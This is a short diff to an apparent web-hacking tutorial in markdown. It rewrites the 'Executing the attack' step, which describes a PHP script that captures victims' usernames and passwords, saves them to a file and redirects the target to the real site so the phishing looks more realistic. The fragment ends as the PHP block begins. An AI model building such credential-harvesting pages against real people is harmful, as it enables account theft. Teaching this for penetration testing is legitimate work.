@@ -45,7 +45,8 @@ For removing Elements we can use `document.getElementById()` function + `.remove
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c2040539-1a58-40c2-97d8-3dafc6a6535f" width="500">
 
 ## Executing the attack.
-We can create a file to get and write the credentails we obtain into a file. We will create a redirection to the original web page in the same file.
+We can create a script to capture and write the credentials we obtain into a file. Additionally, we will create a redirection to the original web page within the same script. This way, the target will be redirected back to the original website, making our attack even more realistic.
+
 ```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
